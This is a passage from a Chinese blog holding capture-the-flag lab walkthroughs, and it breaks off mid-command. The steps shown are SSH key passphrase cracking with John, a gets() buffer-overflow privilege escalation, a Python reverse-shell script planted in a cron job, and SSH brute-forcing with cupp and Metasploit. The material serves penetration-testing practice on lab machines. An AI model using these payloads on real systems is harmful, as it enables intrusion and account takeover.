title="第二个flag"></a>第二个flag</h2><p>在上面还看到了<code>.ssh</code>，同样的也对它进行访问。<br>查看效果，对于源代码，可能会获取flag，或者下一步的提示。<br>挖掘ssh信息，不断访问获取更多泄露的ssh密钥信息。<br><img src="https://img-blog.csdnimg.cn/20200527184442923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>查看源码后，没有找到有效信息。<br>然后考虑这些信息是否是一个文件，可以进行尝试。<br><img src="https://img-blog.csdnimg.cn/20200527184812230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>的确是文件，进行下载。<br>还有第二个认证关键字文件，也要下载。<br>然后将私钥文件进行赋权限，赋给它可读可写的权限。<br>先查看它的权限</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">ls</span> <span class="token operator">-</span>alh</code></pre><p><img src="https://img-blog.csdnimg.cn/20200527185345711.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以看出它并不是完全的可读可写。<br>可读可写的话，就可以进行ssh</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">ssh <span class="token operator">-</span>i id_rsa <span class="token punctuation">[</span>用户名<span class="token punctuation">]</span>@192<span class="token punctuation">.</span>168<span class="token punctuation">.</span>40<span class="token punctuation">.</span>143</code></pre><p>用户名不知道，查看认证文件<br><img src="https://img-blog.csdnimg.cn/20200527203242278.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>用户名应该就是simon了。<br>进行连接<br><img src="https://img-blog.csdnimg.cn/20200527204118309.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>看到连接时需要指纹识别，然后输入yes，发现连接失败了。看信息是没有权限。然后就给权限。</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">chmod 600 id_rsa</code></pre><p><img src="https://img-blog.csdnimg.cn/20200527204435908.png" alt="j4y" loading="lazy"><br>看到了权限有了，重新尝试连接。<br><img src="https://img-blog.csdnimg.cn/20200527204624546.png" alt="j4y" loading="lazy"><br>还要输入密码，但是不知道密码，就尝试输入simon还有123456之类的密码，错了三次就退出来了。<br>现在就是尝试深入探测信息。<br>解密ssh密钥信息<br>使用ssh2john 将id_rsa密钥转换成John可以识别的信息。<br>过程中发现找不到ssh2john这个命令，于是找了网上大佬的方法。<br>找到<code>ssh2john</code>的位置，然后用python直接运行。<br>终于可以转换成功了。<br><img src="https://img-blog.csdnimg.cn/20200527211726274.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>因为我的python默认设置为python3，所以要用python2区分。<br>然后使用John，利用字典，破解密码。</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">zcat <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>wordlists<span class="token operator">/</span>rockyou<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>gz <span class="token punctuation">|</span> sudo john <span class="token operator">--</span>pipe <span class="token operator">--</span>rules rsacrack</code></pre><p><img src="https://img-blog.csdnimg.cn/20200527214709869.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>原本的命令是没有sudo的，但是没有执行不了，可能是因为我用的是普通用户的原因吧。这里可以看出密码是什么了。密码：<code>starwars</code><br>再次进行ssh连接<br><img src="https://img-blog.csdnimg.cn/20200527214944596.png" alt="j4y" loading="lazy"><br>连接成功。<br>但是，找来找去没有找到有用的信息、<br><img src="https://img-blog.csdnimg.cn/2020052721531277.png" alt="j4y" loading="lazy"><br>可能登录的不是root权限，现在开始获取root权限，深入探测根目录。<br><img src="https://img-blog.csdnimg.cn/20200527215547834.png" alt="j4y" loading="lazy"><br>在根目录找到了 flag.txt但是权限不够。<br>说明simon只是一个普通用户，不是root用户组里的成员。所以要提升权限。<br>首先查找具有root权限的文件</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">find <span class="token operator">/</span> <span class="token operator">-</span>perm <span class="token operator">-</span>4000 2><span class="token operator">/</span>dev<span class="token operator">/</span>null</code></pre><p>查看到了这样的<br><img src="https://img-blog.csdnimg.cn/20200528080553827.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>这两个好像是一样，尝试cat这个文件<br><img src="https://img-blog.csdnimg.cn/20200528080722806.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>就这？？就这啊？找到了第二个flag，还不用提升权限就得到了。<br>flag2{use_the_source_luke}</p><h2 id="第三个flag"><a href="#第三个flag" class="headerlink" title="第三个flag"></a>第三个flag</h2><p>审计代码，查看</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token comment">// You're getting close! Here's another flag:</span><span class="token comment">// flag2&#123;use_the_source_luke&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> program<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/usr/local/sbin/message"</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> authorized<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Simon"</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What is your name?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">gets</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// Only compare first five chars to save precious cycles:</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strncmp</span><span class="token punctuation">(</span>authorized<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello %s! Here is your message:\n\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// This is safe as the user can't mess with the binary location:</span>        <span class="token function">execve</span><span class="token punctuation">(</span>program<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Sorry %s, you're not %s! The Internet Police have been informed of this violation.\n"</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> authorized<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p>三个数组，一个是执行文件所在目录，一个空数组，一个认证的数组</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> program<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"/usr/local/sbin/message"</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">char</span> authorized<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"Simon"</span><span class="token punctuation">;</span></code></pre><p>然后一条询问语句：<code>What is your name?</code><br>然后将输入的内容赋值给buf<br>下面是重点，一个判断语句，判断输入的内容的前五个字符与这个认证数组 是否不相等。<br>如果不相等就打印出来我想要的内容，反之就Sorry了。<br>执行一下，这个文件。<br><img src="https://img-blog.csdnimg.cn/20200528082300342.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>提示：</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">Hi Simon<span class="token punctuation">,</span> I hope you like our private messaging system<span class="token punctuation">.</span>I<span class="token string">'m really happy with how it worked out!If you'</span>re interested in how it works<span class="token punctuation">,</span> I've left a <span class="token function">copy</span> of the source code in my home directory<span class="token punctuation">.</span></code></pre><p>那么如果输入溢出了，会回复什么。<br>输入溢出，然后跳转到bin目录下，尝试一下。通过下面一条命令来提升权限</p><pre class="language-powershell" data-language="powershell"><code class="language-powershell">SimonAAAAAAAAAAAAAAA<span class="token operator">/</span>bin<span class="token operator">/</span>sh</code></pre><p><img src="https://img-blog.csdnimg.cn/20200528083240607.png" alt="j4y" loading="lazy"><br>发现已经得到了root权限，检查一下的确是root用户了。<br>现在应该就能cat flag.txt了吧<br><img src="https://img-blog.csdnimg.cn/20200528083415767.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>最后一个flag拿到了。</p><h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>总结此次学习，emmm感觉挺有意思的。回头翻一下看看自己都学到了什么知识。</p><ul><li>dirb对隐藏文件的探测。</li><li>强大的ssh2john进行解密。</li><li>查找root用户权限的文件</li><li>简单的提升权限。(以后多了解一下这个，专门学习一下)</li><li>最后还有看报错。中间有几个错误进行报错了，解决报错的感觉很爽哈哈。报错大致是以下几个</li></ul><ol><li>John无法找到此命令的解决办法</li><li>linux系统中无法输入<code>|</code>管道符的问题解决。</li><li>溢出失败的解决(这个可能是我自己操作有问题哈，出现这个问题应该不多)。就是溢出输入后还是没有root权限。发现是操作失误，忽略掉哈哈。</li></ol><p>文末寄语：</p><blockquote><p>脚步不能达到的地方，眼光可以到达；眼光不能到达的地方，精神可以飞到。——《悲惨世界》</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> CTF靶场系列 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF靶场系列————SSH-服务渗透root主机</title>
      <link href="/posts/29a039ca/"/>
      <url>/posts/29a039ca/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>CTF系列之SSH服务渗透root主机靶场试验。</p><h1 id="小插曲"><a href="#小插曲" class="headerlink" title="小插曲"></a>小插曲</h1><p>安装靶场时除了差错。说小也不小，害<br><img src="https://img-blog.csdnimg.cn/20200531221733886.jpg" alt="j4y" loading="lazy"><br>原本在vmware里安装靶场，但是出现这样的情况。<br><img src="https://img-blog.csdnimg.cn/20200531221918507.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200531221939219.png" alt="j4y" loading="lazy"><br>绝望，找了解决办法，但是不适合我。我吐了，修修改改半天。还是不行。<br>还是先说这个解决办法：<br>先将ova文件后缀改为<code>.rar</code>或者<code>.zip</code>然后解压该文件。会有两个文件被解压出来，分别是<code>.ovf</code>和<code>.vmdk</code>,修改<code>.ovf</code>文件用记事本打开，修改这里<br><img src="https://img-blog.csdnimg.cn/20200531222522938.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后再次尝试打开，如果运气好的话，就可以打开了。<br>但是我没成功，于是开始自己瞎鼓捣。终于皇天不负有心人，搞了俩小时，终于给我整明白了。<br>下面是我的解决方法：<br>下载了Oracle VirtualBox这个软件，又是一个虚拟机的软件，对的。<br>当时想的是，既然它原本是Oracle VirtualBox的版本，那么就下载个试试。然后成功了。可以打开虚拟靶场了。这目前是适合我的解决办法。<br>当然，问题又来了。<br>靶机在Oracle VirtualBox上，kali在vmware上，😂😂😂😂这他喵怎么探测到靶机的IP啊。这个问题就是我头疼了将近俩小时的问题。至于探测方法以及设置问题在下面。</p><h1 id="实验前的准备"><a href="#实验前的准备" class="headerlink" title="实验前的准备"></a>实验前的准备</h1><h2 id="探测IP"><a href="#探测IP" class="headerlink" title="探测IP"></a>探测IP</h2><p>设置问题，<br>vmware中<br><img src="https://img-blog.csdnimg.cn/20200531224340710.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>虚拟网络编辑器<br><img src="https://img-blog.csdnimg.cn/20200531224430864.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br><img src="https://img-blog.csdnimg.cn/20200531224526312.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>可以根据自己的设置来，然后点击应用。<br>然后在kali的虚拟机设置里面设置桥接<br><img src="https://img-blog.csdnimg.cn/20200531224651672.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>Oracle VirtualBox中<br><img src="https://img-blog.csdnimg.cn/20200531224759453.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>设置成和kali的一样的。然后就大功告成了。<br>进kali探测IP地址就行了。</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">ifconfig</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200531224928411.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>发现kali的IP是<code>192.168.1.6</code><br>然后输入</p><pre class="language-shell" data-language="shell"><code class="language-shell">netdiscover -r <span class="token number">192.168</span>.1.1/24</code></pre><p><img src="https://img-blog.csdnimg.cn/20200531225156906.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>就是它了。然后nmap进一步探测信息查看是否正确<br><img src="https://img-blog.csdnimg.cn/20200531225343319.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>好了，证据确凿，就是它了。<br>靶机IP：<code>192.168.1.5</code></p><h1 id="实验开始"><a href="#实验开始" class="headerlink" title="实验开始"></a>实验开始</h1><h2 id="拿到第一个用户权限"><a href="#拿到第一个用户权限" class="headerlink" title="拿到第一个用户权限"></a>拿到第一个用户权限</h2><p>探测靶场全部信息</p><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -A -v <span class="token number">192.168</span>.1.5</code></pre><p>探测靶场的操作系统类型与版本</p><pre class="language-shell" data-language="shell"><code class="language-shell">nmap -O <span class="token number">192.168</span>.1.5</code></pre><p><img src="https://img-blog.csdnimg.cn/20200531230344543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><h3 id="分析探测结果"><a href="#分析探测结果" class="headerlink" title="分析探测结果"></a>分析探测结果</h3><p>针对ssh服务的22号端口。<br>考虑：</p><ul><li><p>1、暴力破解</p></li><li><p>2、私钥泄露（私钥有没有对应的密码。是否可以找到私钥的用户名）<br>对于开放http服务的80端口或者其他端口的靶场<br>优先考虑：</p></li><li><p>1、通过浏览器访问对应的靶场http服务，如http://靶场IP地址:http服务端口</p></li><li><p>2、使用探测工具对http的目录进行探测，如dirb http://靶场IP地址:http服务端口/<br>==特别注意：特殊端口（大于1024的端口）==<br><img src="https://img-blog.csdnimg.cn/20200531231723572.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>先继续</p><h3 id="挖掘敏感信息"><a href="#挖掘敏感信息" class="headerlink" title="挖掘敏感信息"></a>挖掘敏感信息</h3><pre class="language-shell" data-language="shell"><code class="language-shell">dirb http://192.168.1.5/</code></pre><p>然后探测出来一堆<br><img src="https://img-blog.csdnimg.cn/20200531232158488.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后从第一个开始进行访问。运气不错，第二个就得到了这么多信息。再深入查看(还是挨个查看)<br><img src="https://img-blog.csdnimg.cn/20200531232302856.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后发现了这个名字很奇怪的txt文本有东西，是rsa<br><img src="https://img-blog.csdnimg.cn/20200531232441108.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后就到解析网站解析了一番，<a href="http://ctf.ssleye.com/priv_asys.html">传送门</a><br>然后使用nikto扫描器来挖掘敏感信息</p><pre class="language-shell" data-language="shell"><code class="language-shell">nikto -host <span class="token number">192.168</span>.1.5</code></pre><p>特别注意config等特殊敏感文件，要细读扫描的结果。挖掘可以利用的敏感信息；<img src="https://img-blog.csdnimg.cn/20200531233148763.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>利用信息继续进行。<br>将私钥文件下载到桌面上，方便操作。</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">wget</span> <span class="token string">"http://192.168.1.5/icons/VDSoyuAXiO.txt"</span></code></pre><p>然后改个名<br><img src="https://img-blog.csdnimg.cn/20200531233753813.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后，查看id_rsa文件的权限，进行提权<br><img src="https://img-blog.csdnimg.cn/20200531234008398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>利用私钥尝试登录服务器</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">ssh</span> -i id_rsa martin@192.168.1.5</code></pre><p>其中martin是上面已经得到的一个可能的用户名。<br>可以看到已经连接成功<br><img src="https://img-blog.csdnimg.cn/20200531234509579.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>然后将能看到的目录下的文件全列出来找一遍<br><img src="https://img-blog.csdnimg.cn/20200531234738398.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>现在相当于拿到了第一个用户了。</p><h2 id="渗透root用户"><a href="#渗透root用户" class="headerlink" title="渗透root用户"></a>渗透root用户</h2><p>一般flag会在root用户和对应的用户组。<br>使用以下几条命令进行查看信息。所以这个时候应该是提权。</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">cat</span> /etc/passwd<span class="token comment">#查看所有用户的列表</span><span class="token function">cat</span> /etc/group<span class="token comment">#查看用户组</span><span class="token function">find</span> / -user 用户名<span class="token comment">#查看属于某些用户的文件</span>/tmp<span class="token comment">#查看缓冲文件目录</span></code></pre><p>查看过之后也没发现什么特别的信息，<br><img src="https://img-blog.csdnimg.cn/20200601090950954.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>不过发现几个用户。</p><h3 id="深入挖掘"><a href="#深入挖掘" class="headerlink" title="深入挖掘"></a>深入挖掘</h3><p>通过 /etc/crontab 文件，设定系统定期执行的任务，编辑，需要root权限。不同的用户都可以有不同的定时任务。</p></li></ul><p>cat /etc/crontab 挖掘其他用户是否有定时任务，并查看对应的任务内容。执行的任务肯定对应靶场机器的某个文件。</p><p><img src="https://img-blog.csdnimg.cn/2020060111063823.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"></p><p>如果在/etc/crontab 下有某个用户的定时计划文件，但是具体目录下没有这个定时执行文件，可以自行创建反弹shell，然后netcat执行监听获取对应用户的权限。</p><p>如果有定时执行的文件，可以切换到对应的目录，查看对应的权限，查看当前用户是否具有读写权限。</p><p>看到这个文件，但是ls后什么都没发现。所以自己创建反弹shell然后改成这个名字，让它定时执行。</p><p>查看空闲端口，随便挑个进行侦听，这里我选择4444端口。<br>查看占用端口</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">nc</span> -lpv <span class="token punctuation">[</span>未占用端口<span class="token punctuation">]</span></code></pre><p>查看占用端口<br>netstat -pantu<br>然后没有占用4444端口，那就可以使用。<br>自创反弹shell</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">import</span> socket<span class="token punctuation">,</span>os<span class="token punctuation">,</span>subprocesss<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"192.168.1.5"</span><span class="token punctuation">,</span><span class="token number">4444</span><span class="token punctuation">)</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>os<span class="token punctuation">.</span>dup2<span class="token punctuation">(</span>s<span class="token punctuation">.</span>fileno<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>call<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"-i"</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><p><img src="https://img-blog.csdnimg.cn/20200601104553923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>熟练使用vi命令真的重要。<br>再改成那个定时自动执行的文件的名字<br>提权，执行权限给它</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token function">chmod</span> +x sekurity.py</code></pre><p>进行侦听端口后，程序是5分钟执行一次，最多等待5分钟就可以了。</p><p>但是我的没有显示，一直都是这个样子<br><img src="https://img-blog.csdnimg.cn/20200601125131327.png" alt="j4y" loading="lazy"><br>烦。重复执行好几遍都没成功，一直是这样的。<br>吐了。看过教程，发现后面的步骤也没啥了。就是查一下是不是root用户，如果是，进一步探测，不是就放弃这个用户，继续下一个。<br>使用命令</p><pre class="language-shell" data-language="shell"><code class="language-shell"><span class="token comment">#当前用户名</span><span class="token function">whoami</span><span class="token comment">#查看对应权限</span><span class="token function">id</span><span class="token comment">#提权</span><span class="token function">su</span> root</code></pre><h3 id="暴力破解"><a href="#暴力破解" class="headerlink" title="暴力破解"></a>暴力破解</h3><p>最后一个用户，没有其他办法只能进行暴力破解，使用hydra、medusa等工具。<br>使用github上的一个工具创建字典</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone htts://github.com/jeanphorn/common-password.git<span class="token builtin class-name">cd</span> common-password<span class="token comment">#然后执行</span>./cupp.py -i</code></pre><p>当然，如果是python3的话可能会出错。我这里使用python2版本执行就可以了。</p><pre class="language-shell" data-language="shell"><code class="language-shell">python2 cupp.py -i</code></pre><p>然后输入要破解的用户名，生成字典文件。<br><img src="https://img-blog.csdnimg.cn/20200601131632687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODM2NDc0,size_16,color_FFFFFF,t_70" alt="j4y" loading="lazy"><br>字典文件生成完毕，可以进行暴力破解，这里使用metasploit破解ssh</p><pre class="language-shell" data-language="shell"><code class="language-shell">msfconsole-- msf<span class="token operator">></span> use auxiliary/scanner/ssh/ssh_login--msf auxiliary<span class="token punctuation">(</span>ssh_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> rhost <span class="token number">192.168</span>.1.5--msf auxiliary<span class="token punctuation">(</span>ssh_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> username hadi--msf auxiliary<span class="token punctuation">(</span>ssh_login<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> pass_file hadi.txt<span class="token punctuation">[</span>的路径<span class="token punctuation">]</span>--msf auxiliary<span class="token punctuation">(</span>ssh_login<span class="token punctuation">)</span> <span class="token operator">></span> 